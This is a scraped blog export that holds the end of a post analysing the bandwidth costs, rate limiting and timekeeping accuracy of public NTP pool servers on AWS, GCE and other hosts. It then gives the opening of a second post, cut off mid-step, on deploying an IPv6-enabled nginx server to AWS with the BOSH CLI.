speed, the less traffic your server will receive, and the lower the bandwidth costs.\nThe aggregate \u0026ldquo;netspeed\u0026rdquo; for the US zone is 86798173 kbps. This implies the following:\nOur GCE server (and also our AWS server) accounts for 1.15% of the US NTP pool traffic The entire US NTP pool is queried 270,376× every second The entire US NTP pool responds (assuming rate-limiting) 252,495× every second The entire US NTP pool transfers 45.9TiB in NTP responses monthly Using GCE, the entire US NTP pool would cost $4,078 in monthly data transfer costs (GCE\u0026rsquo;s pricing tiers for $/GiB-month are $0.12 for TiB 0-1, $0.11 for TiB 1-10, $0.08 for TiB 10+) 1.3 Geographical Placement The placement of the NTP server has dramatic effect on the bandwidth and cost. For example, our German NTP server\u0026rsquo;s typical outbound monthly traffic is 82.63 GiB, which is 85% less bandwidth than our US/Google server\u0026rsquo;s monthly 541.51 GiB.\nA note about placement: The pool.ntp.org project allows participants to place servers in various zones. A \u0026ldquo;zone\u0026rdquo; consists of a country and that country\u0026rsquo;s continent (there are non-geographic vendor zones as well, e.g. Ubuntu has a zone \u0026ldquo;ubuntu.pool.ntp.org\u0026rdquo;, but those zones fall outside the scope of this discussion). The pool will \u0026ldquo;will try finding the closest available servers\u0026rdquo; for NTP clients, which may or may not be in the same zone.\nWe don\u0026rsquo;t have NTP servers on all continents (we\u0026rsquo;re missing Antarctica, Oceania, and South America), so we don\u0026rsquo;t have insight on the bandwidth requirements for NTP servers placed there; however, we do know that our server in Asia is not as stressed as our US/Google server (166.00 GiB vs. 541.51 Gib).\nWe were curious why the load on our German server was so light, and we believe that part of the reason is that there is much greater participation in the pool.ntp.org project in Europe. Europe, with 2,686 servers, has almost exactly 3× North America\u0026rsquo;s meager 895 servers.\nThe ntp.pool.org\u0026rsquo;s servers, broken out by continent.\n1.4 Rate Limiting We have found that by enabling NTP\u0026rsquo;s rate limiting feature can reduce the outbound traffic by 9.56% on average (as high as 16.60% for our German server and as low as 6.57% for our GCE server).\nBut don\u0026rsquo;t be fooled into thinking that rate limiting\u0026rsquo;s sole purpose is to reduce traffic a measly 9%. Rate limiting has an unintended side benefit: it throttles traffic during excessive NTP query events. For example, Snapchat released a broken iOS client which placed excessive load on NTP servers (see below for more information) in mid-December. Traffic to our AWS server, normally a steady 600 MiB / hour, spiked viciously. In one particular hour (12/18/2016 04:00 - 0500 UTC), the inbound traffic climbed almost ninefold to 4.97 GiB! Fortunately, rate limiting kicked in, and rejected 69.30% of the traffic, which reduced our cost for that hour by 69.30%, for we are charged only for outbound traffic.\nRate limiting is enabled by adding the kod and limited directives in the NTP servers configuration file. In our servers\u0026rsquo; configuration, we use the suggested restrictions for servers \u0026ldquo;who allow others to get the time\u0026rdquo; and \u0026ldquo;to see your server status information\u0026rdquo;. Links to our ntp.conf files can be found here.\nrestrict default limited kod nomodify notrap nopeer restrict -6 default limited kod nomodify notrap nopeer Disclaimer: we\u0026rsquo;re not 100% sure it was rate-limiting that clamped down on our outbound traffic. There is a small chance that it was another factor, e.g. ntpd was overwhelmed and dropped packets, AWS (or GCE) stepped in and limited outbound NTP traffic. We haven\u0026rsquo;t run the numbers.\n1.5 Join the Pool We encourage those with NTP servers with static IPs to join the pool; the experience has been personally rewarding and professionally enriching (how many can claim to operate a service with thousands of requests per second?).\nWe also lay out a cautionary tale: when joining, keep an eye to costs, especially bandwidth. Opting for a lower connection speed initially (e.g. 10Mbps), and ratcheting it up over time is a prudent course of action.\n2. Side Topics 2.0 The Cavalry is Coming: Google\u0026rsquo;s Public NTP Servers Google has announced public NTP servers. Over time, we suspect that this will reduce the load on the pool.ntp.org project\u0026rsquo;s servers.\nServers in the NTP Pool should not use Google\u0026rsquo;s NTP servers as upstream time providers, nor should they use any upstream provider which \u0026ldquo;smears\u0026rdquo; the leap second.\nThere is a schism in the community regarding leap seconds:\nThe NTP pool supports the leap second, which is the UTC standard. The advantage of the leap second is that every second is always the same length, i.e. \u0026ldquo;9,192,631,770 periods of the radiation emitted by a caesium-133 atom in the transition between the two hyperfine levels of its ground state\u0026rdquo;.\nGoogle, on the other hand, smears the leap second, which lengthens the second by 13.9µs during the ten hours leading up to and following the leap seconds. Their reasoning is, \u0026ldquo;No commonly used operating system is able to handle a minute with 61 seconds\u0026rdquo;.\nFor readers interested in using Google\u0026rsquo;s NTP service, the server is time.google.com.\n2.1 The Snapchat Excessive NTP Query Event Cost $13 - $18 (Per Server) In December Snapchat released a version of its iOS app that placed undue stress on the pool.ntp.org servers.\nThis event caused great consternation among the NTP server operators, and words such as \u0026ldquo;decimated\u0026rdquo;, \u0026ldquo;server loss\u0026rdquo;, and \u0026ldquo;sad\u0026rdquo; were used.\nThe effect on two of our servers can be readily seen by our bandwidth graph. First, our AWS server:\nOur AWS chart presents hourly inbound and outbound traffic, measured in MiB. Times are in UTC.\nNote the following leading up to the event:\nInbound traffic is fairly steady, averaging 611 MiB/hour, and so is outbound traffic, averaging 562 MiB/hr. There\u0026rsquo;s little difference between inbound and outbound traffic (i.e. ntpd\u0026rsquo;s rate-limiting is kicking in at a modest ~8%). Note the following about the event and its aftermath:\nThe onset of the event was sudden: on 12/13/2016, inbound traffic jumped from 12.7 GiB the previous day to 18.2 GiB. There were unexplained dips in traffic during the event. For example, on 12/16/2016 0:00 - 3:00 UTC, the inbound traffic fell below 300 MiB/hr. Not only was this extremely low in the midst of an NTP excessive query-event, but it would have been abnormally low during regular service. The event had a long tail. Even though Snapchat released a fix, traffic hadn\u0026rsquo;t normalized by the end of December. Things had improved, but they hadn\u0026rsquo;t gotten gotten back to normal. Next, we present our GCE bandwidth chart:\nOur GCE chart presents per second inbound and outbound traffic, measured in packets. Times are in EST.\nNote the following:\nUnlike AWS, there were no unexplained dips in traffic. Google smoothed the graph — it\u0026rsquo;s not as jagged as AWS\u0026rsquo;s. Similar to AWS, the traffic is steady leading up to the event. The traffic during the event can clearly be seen to follow a daily rhythm. The peak-to-baseline ratio matches that of the AWS graph (baseline of 3.1 kpackets/sec, peak of 25kpackets/sec, shows an 8.3× increase; AWS\u0026rsquo;s was 9×). Rate-limiting clamped down on the most egregious traffic, containing costs. For our last chart, we took our AWS statistics and did the following:\nWe stretched the timescale: we went as far back as 2016-11-01 and as far forward as mid-January, 2017. We examined traffic daily, not hourly, to reduce the spikiness. It was easy to mark the beginning of the event (2016-12-13): it came in with a bang. It was difficult to mark the ending of the event: it went out with a whimper. There was no sudden cliff as traffic fell, rather, it was a slow dwindling of traffic. We chose, for better or worse, to delineate the end of the event by marking a local minimum of traffic (2017-01-12). Note that traffic remained significantly above the baseline after that point. overly-annotated chart of NTP data transfer\nHow much did the NTP event cost us? By our reckoning, the event lasted 30 days, and the average amount of daily traffic above the baseline was 4.97 GiB, for a total of 149.1 GiB. Given that AWS charges $0.09 per GiB, the total cost of the Snapchat event for our AWS server was $13.42. We can extrapolate for our GCE server: the amount of traffic would be similar, but Google\u0026rsquo;s bandwidth is 33% more expensive ($0.12 vs. AWS\u0026rsquo;s $0.09), giving us an estimate of $17.90.\nThere were no additional costs for our German server (we did not exceed the bundled bandwidth).\n2.2 Are Virtual Machines Adequate NTP Servers? Yes. Are Virtual Machines adequate NTP servers? The short answer is, \u0026ldquo;yes\u0026rdquo;, but the long answer is more complex.\nFirst, timekeeping within a VM is complicated (see the excellent VMware Paper for a thorough analysis): there are two ways that a computer (VM) measures the passage of time (tick counting \u0026amp; tickless timekeeping). Tick counting can result in \u0026ldquo;lost ticks\u0026rdquo;, which means the clock loses time (it slows down compared to true time), and tickless timekeeping, which, although eliminates the \u0026ldquo;lost ticks\u0026rdquo; problem, brings its own set of baggage with it (e.g. the hypervisor must know or be notified that the VM is using tickless timekeeping).\nThe result is that a VM\u0026rsquo;s clock can drift quite a bit. In one serverfault.com post, a contributor stated,\nin the pure-VM environment would probably be within, oh, 30 to 100ms of true\nAnd another contributor added:\nRunning NTP in a virtualised [sic] environment, you\u0026rsquo;ll be luck to achieve 20ms accuracy (that\u0026rsquo;s what we\u0026rsquo;ve done using VMware)\u0026hellip;. NTP servers should always be on physical hosts\nBut that flies in the face of our experience. Our VM NTP server on Google\u0026rsquo;s cloud has excellent timekeeping: 99% of its time is within +2ms/-2ms of true. Don\u0026rsquo;t take our word for it, look at the chart [NTP charts] :\nDisclaimer: we cherry-picked our best NTP server; our other servers aren\u0026rsquo;t as accurate. Our Hetzner server, via IPv6, is typically +4ms/-4ms, and via IPv4 is typically +10ms/-10ms, our AWS server +20ms/-20ms, and so is our Microsoft Azure server.\nOur numbers are surprisingly good especially given that the monitoring system used to collect the numbers is susceptible to random network latencies:\nThe monitoring system works roughly like an SNTP (RFC 2030) client, so it is more susceptible by random network latencies between the server and the monitoring system than a regular ntpd server would be.\nThe monitoring system can be inaccurate as much as 10ms or more.\nWe caution the reader not to extrapolate the efficacy of various IaaSes based on the timekeeping of a VM on that IaaS. For example, it would be unwise to assume that Google Cloud is 5 times better than AWS because our Google VM\u0026rsquo;s NTP server is 5 times more accurate. In the Google vs. AWS case, our AWS NTP server is a lower-tier t2.micro, A Burstable Performance Instance which Amazon recommends against using for applications which consistently require CPU:\nIf you need consistently high CPU performance for applications such as video encoding, high volume websites or HPC applications, we recommend you [don\u0026rsquo;t use Burstable Performance Instance].\nWe also find that the network plays a role in the accuracy of the NTP servers. We suspect that is one of the reasons that our Microsoft Azure VM, which is located across the globe (from the Los Angeles-based monitoring station) in Singapore, has among the least accurate metrics. Which leads into our next topic.\n2.3 Sometimes It\u0026rsquo;s the Network, not the VM We were convinced that the network was often a bigger factor than virtualization in NTP latency, but how to prove it? If only we were able to have two exactly identical NTP servers on different networks and measure differences in latency. But how to accomplish that?\nDual-stack.\nThat\u0026rsquo;s right: one of our NTP servers (shay.nono.io) was dual-stack: it had both IPv4 and IPv6 addresses on its single ethernet interface, which eliminated differences in IaaSes, operating systems, RAM, cores, etc\u0026hellip; as factors in latency.\nAnd the difference between the IPv4 and IPv6 was striking:\nThe IPv6 stack never dropped a packet; The IPv4 stack dropped a 4 packets over the course of three days. The IPv6 stack is tightly concentrated in the +3/-4ms range; the IPv4 stack, on the other hand, sprawls across the +20/-20ms range. The upshot is that the network can affect the latency as much as threefold. In the charts below, you can see differences between the IPv6 (top chart) and IPv4 (bottom chart). Note that the latency (offset) is measured on the left axis:\nThere are those who might say, \u0026ldquo;But the comparison is unfair — IPv6 has builtin QOS (Quality Of Service). Of course IPv6 would have better performance!\u0026rdquo;\nRather than argue the relative merits of IPv6 vs. IPv4, we would prefer to present a counter-example: we have a second timeserver (time-home.nono.io) that is dual stack, and it exhibits the opposite behavior (the IPv4 latency is better):\nThe IPv4 stack is concentrated on the -2/-10ms range (8 millisecond spread); the IPv6 traffic has spread that\u0026rsquo;s twice as wide, +10/-5ms (15 millisecond spread). Although this server is not as an extreme example of latency differences as the previous one, it supports our contention that the network can have a powerful effect on latency.\nFor your consumption, we present the charts below, you can see differences between the IPv6 (top chart) and IPv4 (bottom chart). Note that the latency (offset) is measured on the left axis:\nFootnotes [Traffic increase]\nOur costs increased 50% for a simple reason: the amount of NTP traffic increased. When we wrote the original blog post in two and a half years ago in June 2014, our monthly outbound traffic was 332 GiB; in January 2017 it had climbed to 542 GiB (for our GCE NTP server, 520 GiB for our AWS NTP server).\nWe are not sure the reason behind the increase, but it tracks closely with the growth of the public cloud infrastructure. According to IDC:\nThe public cloud IaaS market grew 51% in 2015. IDC expects this high growth to continue through 2016 and 2017 with a CAGR of more than 41%.\n[AWS Network Data]\nWe needed more data. We turned to Amazon\u0026rsquo;s Usage Reports.\nAWS Console → My Account → Reports → AWS Usage Report → Amazon Elastic Compute Cloud\nWe ran a report requesting the following information:\nUsage Types: DataTransfer-Out-Bytes Operation: All Operations Time Period: Custom date range from: Dec 1 2016 to: Jan 18 2017 Report Granularity: Hours click Download report (CSV) We downloaded the report and imported it into a spreadsheet (Google Sheets).\n[NTP statistics]\nNTP statistics are derived from two servers in the NTP pool (ns-aws.nono.io and ns-gce.nono.io) by using the ntpq command after they had been running for a week. Here is the output of the command when run on the ns-gce.nono.io NTP server:\n$ ntpq -c sysstats uptime: 601851 sysstats reset: 601851 packets received: 1874993118 current version: 1455746472 older version: 418760288 bad length or format: 534317 authentication failed: 361395 declined: 393 restricted: 15845 rate limited: 123140728 KoD responses: 15874848 processed for time: 2554 These numbers are necessary but not sufficient: we want to know, \u0026ldquo;how much will my data transfer cost each month?\u0026rdquo; [AWS data transfer cost] To determine that, we\u0026rsquo;ll need to know Amazon data transfer pricing, our inbound and especially outbound traffic, and the size of NTP packets in bytes.\nWe derive additional statistics using the above numbers. In the above example (which was the output from our Google NTP server on Thu Jan 5 04:02:45 UTC 2017) we were able to calculate the traffic in GiB per month as follows:\npackets sent = packets received - bad length or format - authentication failed - declined - restricted - rate limited = 1750940440 [NTP packets sent]\npackets received per second = packets received / uptime = 3115.38 packets sent per second = packets sent / uptime = 2909.26 packets received per month = packets received / uptime × 60 secs/min × 60 mins/hr × 24 hr/day × 30.436875 day/month = 8192651756 packets sent per month = packets sent / uptime × 60 secs/min × 60 mins/hr × 24 hr/day × 30.436875 day/month = 7650612225 gigabytes received per month = packets received per month × bytes per packet [NTP packet size] × gigabytes per byte = 579.88 gigabytes sent per month = packets sent per month × bytes per packet × gigabytes per byte = 541.51 The average number of days per month in the Gregorian calendar is 365.2425 / 12 = 30.436875. It would be irresponsible for a post about NTP to casually peg the number of days in a month to 30. Respect time.\nThe raw data from which the numbers in this blog post are derived can be found in a spreadsheet. The organization is haphazard. The data contained therein is released into the public domain.\n[AWS data transfer]\nAWS charges $0.09 per GiB for Data Transfer (bandwidth) OUT from Amazon EC2 us-east-1 (Virginia) region to Internet. Inbound data transfer is free.\nAs with much of Amazon pricing, this is a rule-of-thumb and subject to qualifiers:\nAmazon has volume discounts; e.g. traffic above 10TB/month is charged at $0.085/GiB, above 50TB/month is charged at $0.07/GiB, etc\u0026hellip; Amazon charges much less for traffic to other Amazon datacenters (e.g. outbound traffic to another AWS Region is $0.02/GiB) Inbound traffic is not always free; Amazon charges, for example, $0.01/GiB for traffic originating from the same Availability Zone using a public or Elastic IPv4 address In spite of these qualifiers, we feel the $0.09/GiB is an appropriate value to use in our calculations.\nAWS measures their data transfer pricing in terms of GiB (230) instead of GB (109) (although their documentation refer to the units as \u0026ldquo;GB\u0026rdquo;).\n[Google data transfer]\nGoogle charges $0.12 per GiB for Data Transfer (bandwidth) OUT from Google Cloud Platform.\nSimilar to AWS\u0026rsquo;s data transfer pricing, there are qualifiers:\nGoogle has volume discounts (e.g. with tiers at 1TB ($0.11) and 10TB ($0.08)) Egress to China (but not Hong Kong) is almost double (e.g. $0.23). Network Egress to Australia is also more expensive ($0.19) Prices do not apply to Google\u0026rsquo;s Content Deliver Network (CDN) service We find Google\u0026rsquo;s pricing to be simpler than Amazon\u0026rsquo;s — Google\u0026rsquo;s pricing is uniform across Google\u0026rsquo;s datacenters, whereas Amazon\u0026rsquo;s data transfer costs can vary by region (datacenter).\nGoogle explicitly defines their data transfer pricing in terms of GiB (230) instead of GB (109). A GB is 0.931 the size of a GiB (the GiB is bigger, and handsomer too, I might add):\nDisk size, machine type memory, and network usage are calculated in gigabytes (GB), where 1 GB is 230 bytes\n[DigitalOcean bandwidth metering]\nDigitalOcean\u0026rsquo;s bandwidth pricing is more aspirational than actual: They have not yet implemented bandwidth metering, though they plan to do so in the future. Per their response to our ticket opened on 2017-01-17 (boldface ours):\nWe do not have a pricing scheme set up yet for bandwidth. As such, we do not actually charge for it. Our engineering team is working on a solution for this, but it has not been given an ETA. We often suggest customers who are heavy BW utilizes to just be kind to our platform \u0026amp; be mindful when we reach out with requests to slow down just a bit, as times, it can become disruptive to customers downstream.\nSome may be tempted, knowing that the bandwidth is not measured, to opt for the lower-tier $5/month server (with 1TB bandwidth) to provide an NTP server to the community. We find such a decision to be on ethically shaky ground, for we know that our bandwidth would most likely exceed that amount (we estimate 1.1 - 1.4 TiB aggregate inbound and outbound), and we\u0026rsquo;d be taking advantage of DigitalOcean\u0026rsquo;s momentary bandwidth blind spot. As such, any benefits we would provide to the community would be, in a sense, fruit of a poisonous tree.\n[NTP packets sent]\nAlthough ntpq -c sysstats does not display the number of packets sent (only the number of packets received), the number can be calculated from the remaining fields, i.e. the number of packets sent minus the number of packets dropped. According to opsenswitch.net, these are the categories of packets that are dropped:\nbad length or format authentication failed declined restricted rate limited [NTP packet size]\nIPv4 NTP packets are 76 octets (bytes) (IPv6 NTP packets are 96 octets, but we ignore the IPv6 packet size for the purposes of our calculations — the two servers (AWS \u0026amp; Google) from which we gather statistics are IPv4-only).\nWe calculate the size as follows: we know the size of an NTP packet is almost always 48 bytes (it can be longer; the NTP RFC allows for for extension fields, key identifiers, and digests in the packet, but in practice we rarely see those fields populated).\nThe NTP packet is encapsulated in a User Datagram Protocol (UDP) packet, which adds 8 octets to the length of the packet, bringing the total length to 56.\nThe UDP packet in turn is encapsulated in an IP (IPv4 or IPv6) packet. IPv4 adds 20 octets to the length of the packet, bringing the total to 76. IPv6 adds 40 octets to the length, for a total of 96.\nThe IP packet in turn is encapsulated in an Ethernet II packet. The Ethernet II header does not include the 7-octet Preamble, the 1-octet Start of frame delimiter, the optional 802.1Q tag (we\u0026rsquo;re not using VLAN-tagging), nor the 4-octet Frame check sequence. It does include the 6-octet MAC destination and the 6-octet source, as well as the 2-octet ethertype field, which adds 14 octets to the length, for a grand total packet size of 90 bytes for IPv4 and 110 bytes for IPv6.\nTo confirm our calculations, we turn to tcpdump, a popular network sniffer (a tools which listens, filters, and decodes network traffic). We use it to expose the lengths of an IPv4 NTP packet.\nThe Ethernet II packet has a length of 90 octets (\u0026ldquo;length 90\u0026rdquo;) The IPv4 portion has a length of 76 octets (\u0026ldquo;length 76\u0026rdquo;) The NTP packet has a length of 48 octets (\u0026ldquo;NTPv4, length 48\u0026rdquo;) $ sudo tcpdump -ennv -i vtnet0 -c 1 port ntp tcpdump: listening on vtnet0, link-type EN10MB (Ethernet), capture size 262144 bytes 07:42:13.181157 d2:74:7f:6e:37:e3 \u0026gt; 52:54:a2:01:66:7d, ethertype IPv4 (0x0800), length 90: (tos 0x0, ttl 44, id 0, offset 0, flags [DF], proto UDP (17), length 76) 107.137.130.39.123 \u0026gt; 172.31.1.100.123: NTPv4, length 48 Client, Leap indicator: clock unsynchronized (192), Stratum 0 (unspecified), poll 4 (16s), precision -6 Root Delay: 1.000000, Root dispersion: 1.000000, Reference-ID: (unspec) Reference Timestamp: 0.000000000 Originator Timestamp: 0.000000000 Receive Timestamp: 0.000000000 Transmit Timestamp: 3692878933.085937805 (2017/01/08 07:42:13) Originator - Receive Timestamp: 0.000000000 Originator - Transmit Timestamp: 3692878933.085937805 (2017/01/08 07:42:13) 1 packet captured 2 packets received by filter 0 packets dropped by kernel Note the flags passed to tcpdump:\n-e capture the Ethernet frame, needed for Ethernet II length. -nn don\u0026rsquo;t lookup hosts, don\u0026rsquo;t lookup ports -v breaks out the size of the UDP packet (56 octets) -i vtnet0 specifies a particular Ethernet interface (typically eth0 on Linux) -c 1 capture one packet then exit port ntp listen for IPv4 packets whose source or destination port is NTP\u0026rsquo;s (123) To capture an IPv6 packet, use this variation:\nsudo tcpdump -ennv -i vtnet0 -c 1 ip6 and port ntp AWS does not bill for the layer 2 (data link layer, Ethernet II) of traffic, only for the IP portion. In other words, NTP packets have a length of 76 octets (as far as billing measurement is concerned). [AWS Network Metrics]\nGoogle, too, does not bill for layer 2 traffic, only for IP traffic. [Google Network Metrics]\n[AWS Network Metrics]\nWe are confident that AWS charges only for the IP-portion of network packets and not the Ethernet portion, but we were unable to find this explicitly in writing. We deduced it by running the following test.\nFirst, we measured the amount of NTP traffic over a one-hour period using the following command on our AWS NTP server. We kicked off the command on Wed Jan 25 05:00:00 UTC 2017:\nntpq -c sysstat; sleep 3600; ntpq -c sysstat; date ... Wed Jan 25 06:00:00 UTC 2017 The number of inbound packets received during the hour was 9,961,945. Now that we know the number of packets, we need to find out the number of bytes. And then it\u0026rsquo;s simple math: we divide the number of bytes by the number of packets. If the number is close to 90, then AWS is measuring the Ethernet frame, 76, the IP frame. We expect the number of inbound bytes to be approximately 757,107,820 (76 × 9,961,945).\nWe generate an AWS Usage report of inbound bytes:\nAWS Console → My Account → Reports → AWS Usage Report → Amazon Elastic Compute Cloud\nCalamity has struck! The number of inbound bytes from 05:00-06:00 is 657,882,293 is much too small. Not even close. Not even possible. The absolute minimum number of bytes is 757,107,820 (that\u0026rsquo;s the number of NTP packets × the minimum NTP packet size, 76 bytes). It\u0026rsquo;s possible to have more traffic (e.g. larger NTP packets, non-NTP traffic (ssh, DNS)), but not less.\nHere\u0026rsquo;s a snippet of the CSV downloaded from AWS:\nService, Operation, UsageType, Resource, StartTime, EndTime, UsageValue ... AmazonEC2,RunInstances,DataTransfer-In-Bytes,,01/25/17 05:00:00,01/25/17 06:00:00,657882293 ... With the numbers we have, there are ~66 bytes per packet, and we need to get to 76 bytes per packet.\nMaybe the report is in a different time zone? No, we know that \u0026ldquo;All usage reports for AWS services are in GMT\u0026rdquo;.\nAha! We forgot the Usage Type DataTransfer-Regional-Bytes. We run that report and see the following data:\nService, Operation, UsageType, Resource, StartTime, EndTime, UsageValue ... AmazonEC2,InterZone-In,DataTransfer-Regional-Bytes,,01/25/17 05:00:00,01/25/17 06:00:00,2052 AmazonEC2,PublicIP-In,DataTransfer-Regional-Bytes,,01/25/17 05:00:00,01/25/17 06:00:00,76761576 Here is an interesting tidbit: 10% of the inbound NTP traffic originates from within the Amazon cloud.\nWe decide to create a chart to visually express how closely our NTP server\u0026rsquo;s statistics matches AWS\u0026rsquo;s data transfer metrics assuming that NTP packets are 76 bytes:\nThe NTP server\u0026rsquo;s statistics are collected every five minutes, and are thus a line. The AWS data transfer statistics are coarser, only by the hour, and show up as purple dots. It\u0026rsquo;s evident that the two correlate, within a few percentage points.\nWe expected the AWS\u0026rsquo;s numbers to exceed ours by a slight amount, for our numbers collected via ntpq only report the NTP traffic, and we know that our server carries other traffic as well (it\u0026rsquo;s a DNS server, too); however, we found the opposite to be true: the traffic reported by AWS was consistently smaller than our NTP traffic, albeit by a small amount. We are not sure why, and are presenting this as a mystery.\nTo collect our statistics, we ran the following on our NTP server:\nwhile :; do /var/vcap/packages/ntp/bin/ntpq -c sysstat \u0026gt; /tmp/ntp.$(date +%s) sleep 300 done We waited several hours, then collated everything:\ncd /tmp/ grep -h received ntp.* | awk \u0026#39;{print $3}\u0026#39; \u0026gt; five_minute_intervals.ntp We uploaded the file into Google Sheets, calculate the delta between the five minute intervals, created a rolling hourly sum, and compared it with the output of the AWS usage report.\n[Google Network Metrics]\nWe are confident that Google charges only for the IP-portion of network packets and not the Ethernet portion, but we were unable to find this explicitly in writing. Instead, we inferred this via the manner in which Google measures packet size, and were so pleased with our methodology that we would like to share it.\nFirst, we brought up in our browser the Google Compute Engine Dashboard, twice. Then we selected our NTP server VM, twice. On one, we selected, \u0026ldquo;Network Packets\u0026rdquo;, and the other we selected \u0026ldquo;Network Bytes\u0026rdquo;. The following is a mash-up of the two charts:\nHaving both numbers allowed us to calculate the number of bytes per packet. If the number was close to 90 bytes per packet, then Google was including the Ethernet/data link layer. If the number was close to 76 bytes per packet, then Google was only counting the IPv4 portion of the packet.\nOur numbers? 76.19 and 76.06, within 0.25% of 76 bytes. Our conclusion? Google is only counting the IPv4 portion of the packet. (You may ask why we are not concerned that the average number of bytes per packet is not exactly 76 bytes. The answer? The servers carry traffic other than NTP (e.g. the Google server is both a DNS server and a Concourse continuous integration (CI) server, which often have packet sizes other than 76 bytes. Also, a small portion of NTP packets are greater than 76 bytes).\n[NTP charts]\nThe NTP Pool project provides publicly-accessible charts for the servers within the pool. Here are links to the charts of the servers that we maintain and to their ntpd (and, in one case, their chronyd) configuration files:\nGoogle server, US (ns-gce.nono.io) (ntp.conf) AWS server, US (ns-aws.nono.io) (ntp.conf) Azure server, Singapore (ns-azure.nono.io) (ntp.conf) Hetzner server, Germany (shay.nono.io) (ntp.conf): IPv4 IPv6 Comcast server, US (time-home.nono.io) (chrony.conf): IPv4 IPv6 Corrections \u0026amp; Updates 2017-02-04\nA quote on the mechanism that pool.ntp.org uses to select servers was missing the phrase, \u0026ldquo;just on those\u0026rdquo;. The quote has been corrected.\nThe calculation for cost of aggregate data transfer for the entire US pool.ntp.org did not take into account tiered pricing. Pricing was adjusted: original cost was $5,640, adjusted cost is $4,078.\nPhrasing was changed to improved readability.\nWe removed a comment that pointed out we had not gathered statistics for our Azure NTP server; it seemed pointless.\n2017-02-01\nThe post mis-characterized the mechanism behind the NTP pool as \u0026ldquo;round-robin DNS\u0026rdquo;; the mechanism is more sophisticated: It targets the users to servers in/near their country and does a weighted round-robin just on those servers.\nAsk Bjørn Hansen said:\nThe system is a little more sophisticated than just round-robin DNS. It targets the users to servers in/near their country and does a weighted round-robin just on those servers.\nWe have added sections describing our motives for operating NTP servers and encouraging others to join the pool. Thanks Leo Bodnar.\nWe wrongly encouraged NTP pool servers to use Google\u0026rsquo;s NTP servers as upstream providers. We now warn against using Google\u0026rsquo;s NTP servers, and provide reasons why (leap seconds). Thanks Joseph B, Ask.\nWe added statistics regarding the aggregate netspeed for the US zone.\nNTP Pool operators suggested the following IaaSes:\nAmazon Lightsail Linode (we\u0026rsquo;ve had positive experience with Linode) Vultr BuyVM Ramnode LunaNode Atlantic ARP Networks (we\u0026rsquo;ve had positive experience with ARP Networks) Scaleway ","permalink":"https://blog.nono.io/post/ntp-costs-500/","summary":"When Hacker News picked up Part 1 of our series of blog posts on running public NTP servers, a contributor said, \u0026ldquo;I wish he\u0026rsquo;d explained \u0026hellip; what they ultimately did (since there\u0026rsquo;s no part 3 that I can find).\u0026rdquo;\nWe had dropped the ball — we had never concluded the series, had never written part 3, had never described the strategies to mitigate the data transfer costs.\nThis blog post remedies that oversight; it consists of two parts: the first part addresses strategies to reduce the cost of running an NTP server, and the second part discusses side topics (aspects of running an NTP server).","title":"Why Is My NTP Server Costing $500/Year? Part 3"},{"content":"This blog post describes the procedure we followed to use the beta BOSH command line interface (CLI) to deploy an nginx webserver with a native IPv6 address (i.e. 2600:1f16:0a62:5c00::4) to AWS in addition to its IPv4 Elastic IP address (i.e. 52.15.73.90). We were then able to browse the webserver via the IPv6 protocol.\nBOSH does not support IPv6. This is a proof-of-concept. Do not apply IPv6 to your production BOSH Directors or to BOSH CLI-deployed systems.\n0. Network Diagram The following is a network diagram of our final configuration:\n1. Disclaimers We do not use a BOSH Director (an orchestrator VM) to deploy an nginx webserver; instead, we use the beta BOSH Golang CLI to deploy the webserver.\nWe do not use the BOSH Ruby command line interface (CLI) to deploy the webserver; instead, we deploy with the beta BOSH Golang CLI. Golang has extensive support for IPv6 [Golang IPv6] .\nThe procedure we follow is not entirely automated. Specifically, we use the AWS management console to manage the webserver\u0026rsquo;s instance\u0026rsquo;s IP addresses in order to auto-assign an IPv6 address to our deployed webserver.\nThe webserver requires an IPv4 address and an IPv4 Elastic IP. The webserver is not exclusively IPv6.\nWe use the BOSH os-conf release to enable IPv6 [IPv4-only Stemcells] with the enable_ipv6 job.\nWe use the BOSH Dynamic Host Configuration Protocol (DHCP) release to manually start the IPv6 DHCP client daemon which acquires an IPv6 address from Amazon [DHCPv6] .\n2. Create AWS Environment We create an IPv6-enabled environment.\nThe BOSH Documentation to create a VPC is quite thorough, and the instructions below are meant to complement the official instructions, not to replace them (for example, we do not describe creating a key pair nor allocating an Elastic IPv4 address). The instructions below describe the additional configuration required for an IPv6 deployment.\n2.0 Create VPC Create an IPv6 VPC. Currently the VPC must be created in the us-east-2 AWS Region (Ohio). Select IPv6 CIDR block → Amazon provided IPv6 CIDR.\n2.1 Create Subnet Create the Subnet in the IPv6 VPC. Select IPv6 CIDR block → Specify a custom IPv6 CIDR\nWe choose the IPv6 2600:1f16:0a62:5c00::/64 Classless Inter-Domain Routing (CIDR) for our subnet [IPv6 CIDR] .\nWe were excited to discover that we could select Subnet Actions → Modify auto-assign IP settings → Enable auto-assign IPv6 address, but disappointed to learn that it had no effect on our BOSH-deployed VM (it had no routable IPv6 addresses when deployed).\n2.2 Create Internet Gateway Create an Internet Gateway.\nAttach it to the IPv6 VPC.\n2.3 Create Route Table Create route table. Add default routes for outbound IPv4 traffic (0.0.0.0/0) and for outbound IPv6 traffic (::/0)\n::/0 is IPv6 shorthand for all IP addresses. A routing table entry whose destination is ::/0 is the default IPv6 route.\n2.4 Associate Route Table with Subnet 2.5 Create Security Group Create the Security Group in the IPv6 VPC\nWe enable all traffic, but we are aware that the security-minded should be much more prudent.\nNote that we enable traffic from all IPv4 sources (0.0.0.0/0) and all IPv6 sources (::/0).\n3. Deploy IPv6-enabled nginx webserver We deploy the nginx webserver.\n3.0 Create BOSH Manifest Here is our BOSH Manifest.\nWe use LastPass to store our secrets (e.g. our AWS Access Key ID and Secret Access Key). The new BOSH CLI allows us to inject our secrets into our manifest (all properties enclosed in a double parentheses are templatized). In this snippet of the manifest, we templatize our Amazon credentials:\naws: access_key_id: ((aws_access_key_id_ipv6)) # \u0026lt;--- Replace with AWS Access Key ID secret_access_key: ((aws_secret_access_key_ipv6)) # \u0026lt;--- Replace with AWS Secret Key 3.1 Deploy with BOSH We deploy our webserver, using the LastPass CLI to read in our secrets from a YAML file which is stored as a secure note:\nbosh create-env bosh-aws-ipv6.yml -l \u0026lt;(lpass show --note deployments) 3.2 Check Instance Networking This step is optional. We ssh to the instance to check IPv6 connectivity, first removing the history of the ssh key of the previous deploy using ssh-keygen -R. We use the IP command ip addr to show the status of our eth0 interface:\n$ ssh-keygen -R 52.15.73.90; ssh -i ~/.ssh/aws_nono.pem vcap@52.15.73.90 ... /:~$ ip addr show dev eth0 2: eth0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; 